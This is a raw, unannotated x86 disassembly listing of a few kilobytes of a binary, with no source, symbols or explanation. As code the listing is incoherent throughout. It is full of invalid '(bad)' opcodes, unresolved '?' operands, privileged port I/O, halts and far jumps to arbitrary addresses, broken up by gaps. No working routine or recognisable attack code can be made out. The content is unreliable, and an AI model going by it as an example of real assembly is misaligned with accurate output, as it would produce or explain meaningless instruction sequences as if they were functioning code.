  40edb4:	add    DWORD PTR [ebx],ebp
  40edb6:	jle    0x40ee31
  40edb8:	retf   
  40edb9:	rol    DWORD PTR [esi-0x4e],0x82
  40edbd:	aaa    
  40edbe:	enter  0x3a66,0x8b
  40edc2:	jmp    0x40ed69
  40edc4:	dec    esp
  40edc5:	sbb    DWORD PTR [ecx+esi*4],0xb
  40edc9:	shr    BYTE PTR [ebx+0x3a7c83ac],cl
  40edcf:	mov    bl,0x6d
  40edd1:	add    al,0x55
  40edd3:	bnd jmp 0x40edf9
  40edd6:	sbb    DWORD PTR [edi+0x8],ebp
  40edd9:	mov    edi,DWORD PTR [ebx-0x4a]
  40eddc:	std    
  40eddd:	(bad)  
  40edde:	cmp    eax,0x1ec102b2
  40ede3:	pop    ebx
  40ede4:	jmp    0x40ee39
  40ede6:	out    0x82,al
  40ede8:	jo     0x40ede2
  40edea:	lock or ah,BYTE PTR [edx+0x4e]
	...
  40ee16:	add    BYTE PTR [eax],al
  40ee18:	sbb    DWORD PTR ss:[ecx-0x64b09508],edi
  40ee1f:	jmp    0x40edf0
  40ee21:	(bad)  
  40ee22:	cmp    eax,0x200069f8
  40ee27:	lds    eax,FWORD PTR [ecx+0x5b]
  40ee2a:	add    bl,ch
  40ee2c:	shl    BYTE PTR ds:0x5332f8f5,0x93
  40ee33:	add    esp,DWORD PTR [ebx+ebx*2]
  40ee36:	push   ss
  40ee37:	push   cs
  40ee38:	and    eax,0xbd03a7fc
  40ee3d:	xchg   esi,eax
  40ee3e:	fmul   DWORD PTR [esi+edi*2]
  40ee41:	test   BYTE PTR es:[edx+0x7829efa],cl
  40ee48:	mov    ebx,0x9652f915
  40ee4d:	out    0x70,eax
  40ee4f:	idiv   DWORD PTR [eax+0x30]
  40ee52:	jmp    0x38ebe8df
  40ee57:	div    edx
  40ee59:	sahf   
  40ee5a:	int    0x11
  40ee5c:	mov    ch,0xfb
  40ee5e:	daa    
  40ee5f:	add    al,0xbd
  40ee61:	xchg   esi,eax
  40ee62:	in     al,dx
  40ee63:	or     bh,BYTE PTR [esi+0x25]
  40ee66:	cli    
  40ee67:	mov    BYTE PTR [edx],al
  40ee69:	stos   DWORD PTR es:[edi],eax
  40ee6a:	imul   edi,DWORD PTR [edx+edi*1+0x5b],0x1bc51b1d
  40ee72:	icebp  
  40ee73:	inc    ebx
  40ee74:	mov    es,WORD PTR [ebx-0x64d773e7]
  40ee7a:	popa   
  40ee7b:	fadd   QWORD PTR [eax]
	...
  40eea5:	add    BYTE PTR [edx-0x560886e0],dh
  40eeab:	arpl   WORD PTR [edx],bx
  40eead:	mul    DWORD PTR [ecx-0x547effa1]
  40eeb3:	loop   0x40eeb3
  40eeb5:	outs   dx,BYTE PTR ds:[esi]
  40eeb6:	xchg   esp,eax
  40eeb7:	pop    ebx
  40eeb8:	lea    ebp,[ebp+ebp*8+0x68f4ff2a]
  40eebf:	cmp    al,BYTE PTR [ecx-0x17]
  40eec2:	mov    esp,0x3ac3079e
  40eec7:	call   0x9e7f:0x6fd14574
  40eece:	jp     0x40ef2b
  40eed0:	sub    DWORD PTR ds:0x92c2e63a,0xfffffff2
  40eed7:	pushf  
  40eed8:	pop    es
  40eed9:	jmp    0x1f2cd4ec
  40eede:	das    
  40eedf:	call   FWORD PTR [si-0x65cb]
  40eee4:	adc    al,0x67
  40eee6:	sbb    bl,BYTE PTR [eax+eax*1]
  40eee9:	push   0x7e
  40eeeb:	bound  edx,QWORD PTR [eax-0x2]
  40eeee:	push   cs
  40eeef:	addr16 (bad) 
  40eef1:	jl     0x40ef28
  40eef3:	call   0x6a00:0x1c1a6b14
  40eefa:	mov    ecx,0x4a348b62
  40eeff:	in     al,0x1
  40ef01:	xor    DWORD PTR [ebx-0x64],edi
  40ef04:	or     ebp,ecx
  40ef06:	push   cs
  40ef07:	out    0xeb,al
  40ef09:	push   0x0
	...
  40ef33:	add    BYTE PTR [ecx+0x4634fe82],bl
  40ef39:	or     ecx,0x65
  40ef3c:	push   eax
  40ef3d:	cdq    
  40ef3e:	or     ch,BYTE PTR [ecx-0x5436a132]
  40ef44:	dec    ebp
  40ef45:	pop    ebx
  40ef46:	call   DWORD PTR [esi+eax*2]
  40ef49:	cmp    DWORD PTR [edi+eax*2-0x56f566d0],0xffffff91
  40ef51:	pop    edi
  40ef52:	leave  
  40ef53:	add    ch,ah
  40ef55:	ins    DWORD PTR es:[edi],dx
  40ef56:	add    bh,bh
  40ef58:	or     ch,BYTE PTR [edx-0x1]
  40ef5b:	jne    0x40ef44
  40ef5d:	test   ebx,eax
  40ef5f:	std    
  40ef60:	nop
  40ef61:	xchg   ecx,eax
  40ef62:	or     eax,eax
  40ef64:	sbb    bl,BYTE PTR [edx+0x5df7c2c7]
  40ef6a:	push   0x1ef772
  40ef6f:	push   0x40fdd6
  40ef74:	outs   dx,DWORD PTR ds:[esi]
  40ef75:	dec    esi
  40ef76:	xchg   edx,eax
  40ef77:	call   DWORD PTR [eax]
  40ef79:	shl    BYTE PTR gs:[ebp-0x20],0x5
  40ef7e:	jb     0x40efe0
  40ef80:	xchg   esi,eax
  40ef81:	pop    ebp
  40ef82:	push   0x1e8093
  40ef87:	call   0x3edb3e
  40ef8c:	pushf  
  40ef8d:	popf   
  40ef8e:	or     eax,0x5f5a84
  40ef93:	add    BYTE PTR [edx],dl
  40ef95:	sbb    edi,esp
  40ef97:	push   eax
	...
  40efc0:	add    BYTE PTR [eax],al
  40efc2:	nop
  40efc3:	or     DWORD PTR [edi+edi*8],ecx
  40efc6:	push   0xb
  40efc8:	pusha  
  40efc9:	inc    ecx
  40efca:	xchg   edi,eax
  40efcb:	fadd   st(2),st
  40efcd:	or     BYTE PTR [ebp+ebx*4+0xd],ch
  40efd1:	test   edx,eax
  40efd3:	pop    ebp
  40efd4:	add    BYTE PTR [eax],al
  40efd6:	std    
  40efd7:	pop    esi
  40efd8:	lea    eax,[ebp-0x71]
  40efdb:	cs push 0xffffffff
  40efde:	out    dx,eax
  40efdf:	arpl   WORD PTR [ecx+0x41],sp
  40efe2:	mov    ?,WORD PTR [bp+di-0x4]
  40efe6:	nop
  40efe7:	imul   edi,DWORD PTR [edx+0x60],0xc4835f16
  40efee:	cmp    esp,DWORD PTR [eax+eax*8+0xf]
  40eff2:	call   0xf382:0x3effffdf
  40eff9:	je     0x40f021
  40effb:	jmp    0x8304:0x439e7e0e
  40f002:	cli    
  40f003:	jle    0x40f084
  40f005:	mul    DWORD PTR [edx-0x6b17026a]
  40f00b:	add    DWORD PTR [edx],0x0
  40f00e:	retf   
  40f00f:	(bad)  
  40f010:	out    dx,al
  40f011:	dec    edi
  40f012:	fs xor bl,0x74
  40f016:	out    0x1a,al
  40f018:	adc    bh,bh
  40f01a:	loope  0x40f045
  40f01c:	or     eax,eax
  40f01e:	dec    ecx
  40f01f:	push   es
  40f020:	inc    ebp
  40f021:	add    DWORD PTR [esi],edi
  40f023:	cmp    BYTE PTR [edi+0x7c],0x0
	...
  40f04f:	add    dl,dl
  40f051:	add    BYTE PTR [ebx],0x84
  40f054:	jnp    0x40efd9
  40f056:	add    al,BYTE PTR [eax]
  40f058:	mov    esi,0xba0f027a
  40f05d:	mov    dh,0x1
  40f05f:	add    BYTE PTR [esi],bh
  40f061:	rol    BYTE PTR [edi+0x50c4aa54],cl
  40f067:	call   0xff35f9d6
  40f06c:	hlt    
  40f06d:	or     bh,BYTE PTR [edi]
  40f06f:	call   0xff3007fd
  40f074:	or     ebx,DWORD PTR [edx+0x52]
  40f077:	call   0xff34f989
  40f07c:	jns    0x40f0bd
  40f07e:	hlt    
  40f07f:	jmp    FWORD PTR [ecx-0x7e]
  40f082:	add    al,bh
  40f084:	sti    
  40f085:	aad    0x2
  40f087:	add    BYTE PTR [esi],bh
  40f089:	cmp    BYTE PTR [edi+0x3c],0xc4
  40f08d:	and    al,BYTE PTR [ebx+0x0]
  40f090:	ds push edi
  40f092:	push   edx
  40f093:	push   0x4323be
  40f098:	es pop ebx
  40f09a:	arpl   WORD PTR [edx+0x3e],si
  40f09d:	pop    ebx
  40f09e:	cmp    DWORD PTR [esi+edi*4-0x7],ebp
  40f0a2:	daa    
  40f0a3:	add    al,0x21
  40f0a5:	push   cs
  40f0a6:	sub    ebx,0x3e90c9f
  40f0ac:	inc    ebp
  40f0ad:	fwait
  40f0ae:	hlt    
  40f0af:	sbb    edx,DWORD PTR [esi+0x4307e0]
	...
  40f0dd:	add    BYTE PTR [esi],bh
  40f0df:	or     DWORD PTR [esi+0x72],0x3e
  40f0e3:	pop    ebx
  40f0e4:	mov    ecx,0xa7f9b96b
  40f0e9:	add    ebp,ecx
  40f0eb:	or     eax,0xc7beb41
  40f0f0:	jmp    0xbcdc35f8
  40f0f5:	dec    ebx
  40f0f6:	callw  0x33c1
  40f0fa:	sub    DWORD PTR ds:[edx+0x72],0x3e
  40f0ff:	pop    ebx
  40f100:	cdq    
  40f101:	imul   ecx,ecx,0xfffffff9
  40f104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f105:	add    esi,DWORD PTR [ecx+0x57eb110d]
  40f10b:	or     al,0xe9
  40f10d:	add    edx,DWORD PTR [ebp-0x3bc995b8]
  40f113:	cli    
  40f114:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f115:	add    edi,DWORD PTR [edi]
  40f117:	push   cs
  40f118:	jecxz  0x40f185
  40f11a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f11b:	stc    
  40f11c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f11d:	add    edx,DWORD PTR [esi+0x3e037837]
  40f123:	sub    edx,DWORD PTR [ecx-0x74]
  40f126:	ficomp WORD PTR [ecx]
  40f128:	jmp    0xc0c3e41f
  40f12d:	or     ebp,ebp
  40f12f:	pop    edx
  40f130:	jmp    0x41d3613
  40f135:	jle    0x40f128
  40f137:	sbb    ecx,ebp
  40f139:	add    eax,0x2005cd3
  40f13e:	jp     0x40f1a4
  40f140:	shl    BYTE PTR [eax+eax*1],0x0
	...
  40f16c:	pushf  
  40f16d:	call   0x1cb8eb6
  40f172:	add    DWORD PTR [esi-0x23186c59],ebx
  40f178:	das    
  40f179:	xchg   esi,eax
  40f17a:	dec    BYTE PTR [esi-0x6eb07069]
  40f180:	pop    ebp
  40f181:	cwde   
  40f182:	(bad)  
  40f183:	jle    0x40f110
  40f185:	pop    ds
  40f186:	lock fs ja 0x40f119
  40f18a:	dec    edi
  40f18b:	add    eax,DWORD PTR [eax-0x6a]
  40f18e:	je     0x40f1f1
  40f190:	adc    dh,BYTE PTR [edx-0x2]
  40f193:	pop    esi
  40f194:	in     eax,dx
  40f195:	xchg   ebp,eax
  40f196:	je     0x40f1f5
  40f198:	mov    al,BYTE PTR [ebx-0x6a32b3ec]
  40f19e:	mov    BYTE PTR [ecx+esi*8+0x42517cd9],ch
  40f1a5:	sysenter 
  40f1a7:	push   0x4f
  40f1a9:	xchg   edi,edi
  40f1ab:	mov    ah,0x5f
  40f1ad:	add    eax,DWORD PTR [eax]
  40f1af:	jmp    0x953fca50
  40f1b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1b5:	jle    0x40f184
  40f1b7:	imul   ebp,DWORD PTR [ebp+0x7594fe95],0xffffff95
  40f1be:	je     0x40f1b1
  40f1c0:	jne    0x40f201
  40f1c2:	cmp    esi,0xffffff8c
  40f1c5:	xchg   ebp,eax
  40f1c6:	je     0x40f1c1
  40f1c8:	mov    WORD PTR [edi],cs
  40f1ca:	or     BYTE PTR [ecx],al
  40f1cc:	dec    eax
  40f1cd:	(bad)  
  40f1cf:	out    0x0,al
	...
  40f1f9:	add    BYTE PTR [edi+ecx*1-0x14],ch
  40f1fd:	fsubrp st(6),st
  40f1ff:	(bad)  
  40f200:	call   0xfed6aaeb
  40f205:	into   
  40f206:	(bad)  
  40f207:	mov    ah,bh
  40f209:	add    BYTE PTR [ebx-0x7700021d],dl
  40f20f:	adc    ebp,esp
  40f211:	call   0x3ed591
  40f216:	call   0xc429da2d
  40f21b:	loop   0x40f21a
  40f21d:	dec    esi
  40f21f:	frndint 
  40f221:	dec    eax
  40f223:	mov    BYTE PTR [ebx-0x4],dh
  40f226:	enter  0x7672,0x60
  40f22a:	pop    di
  40f22c:	add    esp,0x23
  40f22f:	mov    dl,0x7f
  40f231:	cld    
  40f232:	mov    BYTE PTR [ecx+0x5a17c2c7],cl
  40f238:	push   ebp
  40f239:	mov    ecx,DWORD PTR [ebx-0x77ff95d3]
  40f23f:	adc    ecx,DWORD PTR [eax]
  40f241:	call   0x3f08f2
  40f246:	pop    esp
  40f247:	mov    ds:0xa4de851,al
  40f24c:	add    BYTE PTR [eax],al
  40f24e:	int3   
  40f24f:	cdq    
  40f250:	jb     0x40f26d
  40f252:	aam    0x9c
  40f254:	inc    esi
  40f255:	jmp    0x40f1ec
  40f257:	fnstenv [esi]
  40f259:	or     eax,0x388062d3
	...
  40f286:	add    BYTE PTR [eax],al
  40f288:	lods   eax,DWORD PTR ds:[esi]
  40f289:	adc    al,BYTE PTR ds:0xeb5997c6
  40f28f:	add    bh,BYTE PTR [ebx+eiz*2]
  40f292:	dec    eax
  40f293:	cmp    esp,DWORD PTR [ebp+ecx*1-0x16]
  40f297:	mov    edx,DWORD PTR [ebp+eiz*1-0x37]
  40f29b:	ret    0x5993
  40f29e:	push   ebp
  40f29f:	mov    edi,DWORD PTR [ebx-0x21]
  40f2a2:	ret    0x30b4
  40f2a5:	mov    WORD PTR [ebx+0xc],?
  40f2a8:	(bad)
  40f2ac:	lods   eax,DWORD PTR ds:[esi]
  40f2ae:	cld    
  40f2af:	mov    edi,0xc94f7ed3
  40f2b4:	jl     0x40f269
  40f2b6:	add    bh,bh
  40f2b8:	rol    DWORD PTR [edi-0x336db226],cl
  40f2be:	lock or bh,dh
  40f2c1:	dec    esi
  40f2c2:	pop    es
  40f2c3:	pop    edi
  40f2c4:	pop    es
  40f2c5:	rcl    DWORD PTR [ebx],0x0
  40f2c8:	sub    DWORD PTR [eax+0x18],esi
  40f2cb:	jmp    FWORD PTR [ebx+0x1554da92]
  40f2d1:	out    0xf0,al
  40f2d3:	mov    WORD PTR [ebx+0x12],?
  40f2d6:	push   esp
  40f2d7:	call   DWORD PTR [ebx-0x4b0e257a]
  40f2dd:	or     eax,0xb5fe0af1
  40f2e2:	xchg   BYTE PTR [edi],al
  40f2e4:	cmp    eax,0x73ff0282
  40f2e9:	ss icebp 
  40f2eb:	je     0x40f2ed
	...
  40f315:	add    dh,ah
  40f317:	sbb    bh,BYTE PTR [ebx-0x2da2671]
  40f31d:	mov    edi,0x1e00641
  40f322:	cmp    BYTE PTR ds:[ecx+0x44],0xd2
  40f327:	stc    
  40f328:	jmp    0x40f3a9
  40f32a:	jns    0x40f2ae
  40f32c:	inc    DWORD PTR [ebx+0x28088]
  40f332:	adc    DWORD PTR [edx+0x57],ebp
  40f335:	jmp    DWORD PTR [ecx+0x6e447b6d]
  40f33b:	gs ja  0x40f30e
  40f33e:	es pop ebp
  40f340:	fs inc ecx
  40f342:	ds push 0x65
  40f345:	jo     0x40f385
  40f347:	adc    BYTE PTR [edx-0x1],0xf3
  40f34b:	jno    0x40f3a9
  40f34d:	add    ebx,edi
  40f34f:	pop    edx
  40f350:	sub    BYTE PTR [esi+edx*2],al
  40f353:	cs pop ecx
  40f355:	add    al,0x3e
  40f357:	sub    edx,esi
  40f359:	jbe    0x40f3c9
  40f35b:	add    esp,esi
  40f35d:	(bad)  
  40f35e:	call   FWORD PTR [edx-0x2f]
  40f361:	dec    eax
  40f362:	into   
  40f363:	pop    edx
  40f364:	jmp    0xa9a0dab6
  40f369:	ja     0x40f3b5
  40f36b:	pusha  
  40f36c:	fwait
  40f36d:	ja     0x40f3b5
  40f36f:	pusha  
  40f370:	mov    al,0x0
  40f372:	ret    
  40f373:	loopne 0x40f35f
  40f375:	add    edi,DWORD PTR [esi]
  40f377:	pusha  
  40f378:	mov    al,ds:0x76
	...
  40f3a1:	add    BYTE PTR [eax],al
  40f3a3:	add    BYTE PTR [edi-0x64],al
  40f3a6:	and    edi,DWORD PTR [eax+0x3e95b3e]
  40f3ac:	adc    eax,0xca46a65c
  40f3b1:	pop    edx
  40f3b2:	jmp    0xb9d831ba
  40f3b7:	ret    
  40f3b8:	mov    dh,0x93
  40f3ba:	gs lock call 0x396c8249
  40f3c1:	push   cs
  40f3c2:	jmp    0xe8c4768f
  40f3c7:	add    edi,DWORD PTR [esi]
  40f3c9:	pop    ebx
  40f3ca:	imul   esi,DWORD PTR [eax],0x4b65643e
  40f3d0:	cmp    al,0x5b
  40f3d2:	jmp    0x2ef49a2f
  40f3d7:	lock mov al,0xe1
  40f3da:	stos   DWORD PTR es:[edi],eax
  40f3db:	mov    edi,0x31115bc
  40f3e0:	sub    edi,DWORD PTR [edx]
  40f3e2:	adc    ecx,0xf0e91a08
  40f3e8:	or     ah,BYTE PTR [edi+0x5b18e810]
  40f3ee:	jmp    0xa4b5ef
  40f3f3:	ins    BYTE PTR es:[edi],dx
  40f3f4:	dec    ebx
  40f3f5:	pop    ecx
  40f3f6:	add    cl,ch
  40f3f8:	xchg   BYTE PTR [esi],bl
  40f3fa:	call   0x9c31e7
  40f3ff:	shl    BYTE PTR [eax+0x59],1
  40f402:	add    cl,ch
  40f404:	mov    esp,0xe8e816
	...
  40f431:	add    dh,dl
  40f433:	arpl   WORD PTR [ecx+0x449c5644],cx
  40f439:	sar    DWORD PTR [ebx+ebx*2],1
  40f43c:	add    cl,ch
  40f43e:	sbb    bl,BYTE PTR [esi-0x21c21700]
  40f444:	jl     0x40f3d7
  40f446:	cmp    al,0x8
  40f448:	pshufw mm5,QWORD PTR [edi-0x5d33985],0x5d
  40f450:	add    cl,ch
  40f452:	cmp    eax,0x3de8ad84
  40f457:	pop    ebx
  40f458:	cmp    esp,0xffffffe5
  40f45b:	pop    ebp
  40f45c:	jne    0x40f444
  40f45e:	jp     0x40f46f
  40f460:	fsub   QWORD PTR [esi-0x16fc7c79]
  40f466:	cmp    eax,0x3b80e95b
  40f46b:	pop    ebx
  40f46c:	add    BYTE PTR [edx+0x4f],ch
  40f46f:	add    DWORD PTR [ebx],0xffffffd4
  40f472:	shl    bl,1
  40f474:	jl     0x40f497
  40f476:	add    DWORD PTR [eax],ebx
  40f478:	call   0x9c3261
  40f47d:	inc    eax
  40f47e:	(bad)  
  40f47f:	pop    ebx
  40f480:	add    cl,ch
  40f482:	mov    esp,0xa8ece80f
  40f487:	xlat   BYTE PTR ds:[ebx]
  40f488:	ins    BYTE PTR es:[edi],dx
  40f489:	call   0x94ca4fcb
  40f48e:	jno    0x40f46d
  40f490:	jl     0x40f4e7
  40f492:	cmp    al,BYTE PTR [edi]
  40f494:	or     DWORD PTR [eax],eax
	...
  40f4be:	add    BYTE PTR [eax],al
  40f4c0:	pop    eax
  40f4c1:	and    al,0xe8
  40f4c3:	add    dl,BYTE PTR [edi+0x68eb005e]
  40f4c9:	cdq    
  40f4ca:	inc    ebx
  40f4cb:	call   0x415329
  40f4d0:	cwde   
  40f4d1:	and    eax,eax
  40f4d3:	add    BYTE PTR [edi+0x5e],dl
  40f4d6:	add    bh,al
  40f4d8:	sub    cl,bh
  40f4da:	(bad)  
  40f4db:	jmp    DWORD PTR [edi+0x5e]
  40f4de:	mov    DWORD PTR [ebp-0x65],0x5700005e
  40f4e5:	cdq    
  40f4e6:	inc    ebx
  40f4e7:	mov    esp,0x5e27
  40f4ec:	fsub   DWORD PTR [edx]
  40f4ee:	mov    eax,0x5e1700
  40f4f3:	dec    DWORD PTR [edx-0x7d]
  40f4f6:	out    0x13,al
  40f4f8:	mov    cl,0x80
  40f4fa:	std    
  40f4fb:	mov    DWORD PTR [edx-0x69],ebx
  40f4fe:	std    
  40f4ff:	jne    0x40f4e4
  40f501:	mov    ch,0x6
  40f503:	inc    BYTE PTR [eax-0x60ba787f]
  40f509:	xor    BYTE PTR [ebx-0x2c],0xbf
  40f50d:	mov    bh,bl
  40f50f:	jmp    DWORD PTR [eax+0xf]
  40f512:	inc    esp
  40f513:	les    edx,FWORD PTR [ebx+ecx*2-0x76]
  40f517:	pusha  
  40f518:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f519:	pop    ebp
  40f51a:	add    BYTE PTR [ebp-0x6b],dh
  40f51d:	xor    eax,0x5d966180
  40f522:	call   0x40f5ae
	...
  40f54b:	add    BYTE PTR [eax],al
  40f54d:	add    cl,dh
  40f54f:	pop    ebp
  40f550:	add    BYTE PTR [eax+0x7f],dl
  40f553:	fstp   QWORD PTR [edi+0x41]
  40f556:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f557:	xor    BYTE PTR [ebx-0x40],0x4f
  40f55b:	jno    0x40f5cd
  40f55d:	add    BYTE PTR [edi+0x3e74be94],dl
  40f563:	mov    WORD PTR [edx-0x79],ds
  40f566:	pop    ds
  40f567:	ret    
  40f568:	add    ch,al
  40f56a:	adc    eax,0xee0002ea
  40f56f:	jmp    0x40f4f6
  40f571:	pusha  
  40f572:	inc    DWORD PTR [ebx+0x5b7e74ed]
  40f578:	adc    dh,BYTE PTR [eax+0x3e]
  40f57b:	test   bh,dh
  40f57d:	mov    edi,0x8f5c70ea
  40f582:	fild   WORD PTR [edx+0x4]
  40f585:	call   0x45478b
  40f58a:	out    dx,al
  40f58b:	sub    edi,DWORD PTR [ebp+0x60]
  40f58e:	inc    DWORD PTR [ebx-0x65018b15]
  40f594:	hlt    
  40f595:	outs   dx,BYTE PTR ds:[esi]
  40f596:	ds adc bh,0x24
  40f59a:	mov    ebp,0x7f5f7877
  40f59f:	add    BYTE PTR [ecx],0x75
  40f5a2:	xor    al,0x5a
  40f5a4:	mov    WORD PTR [eax+0x7f],fs
  40f5a7:	sbb    dl,0x2b
  40f5aa:	cwde   
  40f5ab:	add    BYTE PTR [edx],0x50
  40f5ae:	xchg   esi,eax
  40f5af:	cli    
  40f5b0:	bound  eax,QWORD PTR [ecx+0x0]
	...
  40f5db:	add    BYTE PTR [esi],bh
  40f5dd:	or     DWORD PTR [edi-0x40],esi
  40f5e0:	out    0xe6,al
  40f5e2:	pop    esp
  40f5e3:	add    BYTE PTR [esi],bh
  40f5e5:	sub    eax,0x8dfe2b02
  40f5ea:	ret    0x5c74
  40f5ed:	sub    DWORD PTR [edi-0x38],esi
  40f5f0:	out    0xb0,al
  40f5f2:	pop    esp
  40f5f3:	add    BYTE PTR [esi],bh
  40f5f5:	bnd jmp 0x40f66c
  40f5f8:	imul   BYTE PTR [edx]
  40f5fa:	stc    
  40f5fb:	stc    
  40f5fc:	mov    ecx,0xf2447b49
  40f601:	inc    ecx
  40f602:	ja     0x40f5c8
  40f604:	xchg   esi,eax
  40f605:	pop    ebx
  40f606:	and    ebx,DWORD PTR [edi+0x3e]
  40f609:	pop    ebx
  40f60a:	mov    ecx,0x9712ec
  40f60f:	cmc    
  40f610:	xchg   esi,eax
  40f611:	nop
  40f612:	or     eax,0x69d3027b
  40f617:	outs   dx,DWORD PTR ds:[esi]
  40f618:	jle    0x40f675
  40f61a:	jne    0x40f653
  40f61c:	mov    ebp,0xea04310e
  40f621:	inc    eax
  40f622:	add    DWORD PTR [ebx],0xeca6803e
  40f628:	jmp    0xd58f:0xd8b3d162
  40f62f:	in     al,dx
  40f630:	retf   0xcd9a
  40f633:	jbe    0x40f66b
  40f635:	sub    ebp,0xffffff83
  40f638:	inc    eax
  40f639:	nop
  40f63a:	mov    ebp,0x3b8ffa76
  40f63f:	cld    
	...
  40f668:	add    BYTE PTR [eax],al
  40f66a:	sbb    DWORD PTR [edi-0x6fd712d3],ecx
  40f670:	sbb    ebp,DWORD PTR [eax+eiz*1+0xedbf106]
  40f677:	adc    BYTE PTR [esi-0x56f9ef14],dl
  40f67d:	fcomi  st,st(3)
  40f67f:	fadd   QWORD PTR [ebp-0x4ef9ff14]
  40f685:	fisttp DWORD PTR [ebx]
  40f687:	fnsave [ebp-0x14]
  40f68a:	lock add eax,0xdd03dba5
  40f690:	gs in  al,dx
  40f692:	loopne 0x40f699
  40f694:	popf   
  40f695:	fistp  DWORD PTR [ebx-0x2f13aa24]
  40f69b:	add    eax,0xdc93db91
  40f6a0:	inc    ebp
  40f6a1:	in     al,dx
  40f6a2:	aam    0x5d
  40f6a4:	push   0x6e
  40f6a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6a7:	pop    eax
  40f6a8:	add    BYTE PTR [edx+edi*1+0x3f414498],bh
  40f6af:	pop    ebx
  40f6b0:	add    cl,ch
  40f6b2:	mov    esi,0x11e9e80e
  40f6b7:	dec    ebx
  40f6b8:	push   0x1a5237
  40f6bd:	push   cs
  40f6be:	adc    BYTE PTR [edi+0x5ae011e7],bl
  40f6c4:	add    dl,dh
  40f6c6:	jge    0x40f6ce
  40f6c8:	pop    es
  40f6c9:	cs clc 
  40f6cb:	add    BYTE PTR [eax],0xe9
	...
  40f6f6:	add    BYTE PTR [eax],al
  40f6f8:	cmp    eax,0xdb65685b
  40f6fd:	sbb    DWORD PTR [eax],eax
  40f6ff:	fmulp  st(7),st
  40f701:	sahf   
  40f702:	out    0xb9,eax
  40f704:	neg    DWORD PTR [edx+0x0]
  40f707:	loop   0x40f786
  40f709:	push   es
  40f70a:	pop    es
  40f70b:	scas   al,BYTE PTR es:[edi]
  40f70c:	inc    DWORD PTR [edx+0x5b3de901]
  40f712:	(bad)  
  40f713:	cmp    al,0xf6
  40f715:	jbe    0x40f77f
  40f717:	imul   edx,DWORD PTR ds:0xfddafb8e,0xffffffd3
  40f71e:	(bad)  
  40f71f:	sahf   
  40f720:	and    eax,0x6247f18e
  40f725:	push   esi
  40f726:	pcmpgtb mm6,QWORD PTR [ebp+0x1586fe8f]
  40f72d:	or     al,dl
  40f72f:	xchg   ecx,eax
  40f730:	xor    eax,0xe576fed9
  40f735:	pop    es
  40f736:	in     al,dx
  40f737:	cmp    DWORD PTR [ebp-0x27],0x176766fe
  40f73e:	lock mov ecx,0x568808f5
  40f744:	in     eax,0x76
  40f746:	jmp    0x40f799
  40f748:	aad    0x8d
  40f74a:	pop    esi
  40f74b:	add    BYTE PTR [esi],cl
  40f74d:	xchg   ebp,eax
  40f74e:	push   cs
  40f74f:	add    dl,dl
  40f751:	or     eax,0xcb6381eb
  40f756:	cld    
  40f757:	call   FWORD PTR [eax-0x66]
  40f75a:	cmp    DWORD PTR [eax+0x0],0x0
	...
  40f785:	add    BYTE PTR [ecx-0x7e],bl
  40f788:	std    
  40f789:	add    BYTE PTR [edi-0x1d74ffa6],ah
  40f78f:	pop    esi
  40f790:	or     eax,eax
  40f792:	mov    bl,0x5b
  40f794:	cmp    BYTE PTR [eax],0x97
  40f797:	or     eax,DWORD PTR ds:0x58a3e9
  40f79d:	add    BYTE PTR [eax+0xb],ch
  40f7a0:	adc    al,0xe8
  40f7a2:	iret   
  40f7a3:	adc    edi,esi
  40f7a5:	jmp    FWORD PTR [edx+ebx*4+0x73]
  40f7a9:	pxor   mm6,QWORD PTR [ebp+0x4d]
  40f7ad:	inc    ecx
  40f7ae:	xor    DWORD PTR [bp+di+0x14],0xff83ec7f
  40f7b6:	js     0x40f765
  40f7b8:	or     ebp,DWORD PTR [eax+0xf]
  40f7bb:	push   ecx
  40f7bc:	inc    ecx
  40f7bd:	add    al,ch
  40f7bf:	or     dl,BYTE PTR [eax+ebp*8]
  40f7c2:	mov    al,ds:0xaefffddb
  40f7c7:	(bad)  [esi+0x6680b8fe]
  40f7cd:	ds es pop edx
  40f7d0:	add    BYTE PTR [ebp-0x3675e],cl
  40f7d6:	mov    eax,0x66ffe829
  40f7db:	cmp    ebp,0xfc98628d
  40f7e1:	call   FWORD PTR [eax+0x2a]
  40f7e4:	push   DWORD PTR [ebp-0x27c61]
	...
  40f812:	add    BYTE PTR [eax],al
  40f814:	outs   dx,DWORD PTR ds:[esi]
  40f815:	inc    edi
  40f816:	ins    DWORD PTR es:[edi],dx
  40f817:	add    BYTE PTR [esi],bh
  40f819:	test   BYTE PTR [ebx-0x7c],bh
  40f81c:	mov    bl,BYTE PTR ds:0x857efeea
  40f822:	jle    0x40f809
  40f824:	aas    
  40f825:	test   BYTE PTR [edx],al
  40f827:	(bad)  
  40f828:	retf   
  40f829:	inc    ecx
  40f82a:	jmp    0x585a22d
  40f82f:	adc    BYTE PTR [esi],bh
  40f831:	test   BYTE PTR [edx],al
  40f833:	cmpunordps xmm0,XMMWORD PTR [eax]
  40f837:	add    BYTE PTR [esi],bh
  40f839:	test   DWORD PTR [esp+ebp*1-0x12],0xff4ec8db
  40f841:	sbb    edx,0x9
  40f844:	jmp    0x40f7c9
  40f846:	add    cl,BYTE PTR [ebx]
  40f848:	jle    0x40f858
  40f84a:	add    cl,ch
  40f84c:	mov    BYTE PTR [edx+0xeb30002],0xc6
  40f853:	std    
  40f854:	pop    ecx
  40f855:	lods   al,BYTE PTR ds:[esi]
  40f856:	jbe    0x40f899
  40f858:	and    dl,BYTE PTR [esp+ebx*2-0x20]
  40f85c:	stc    
  40f85d:	inc    edx
  40f85e:	add    al,0xe8
  40f860:	push   ebx
  40f861:	daa    
  40f862:	add    al,0x0
  40f864:	inc    ebp
  40f865:	ret    0x56e
  40f868:	daa    
  40f869:	dec    edx
  40f86a:	add    eax,DWORD PTR [eax]
  40f86c:	ds mov ebp,0x2f16146e
  40f872:	js     0x40f872
  40f874:	sbb    DWORD PTR [edx+0x74c2],ecx
	...
  40f8a2:	inc    ecx
  40f8a3:	pop    edx
  40f8a4:	mov    DWORD PTR [edi+0x7f],eax
  40f8a7:	and    bh,0x74
  40f8aa:	sub    ch,dl
  40f8ac:	cmc    
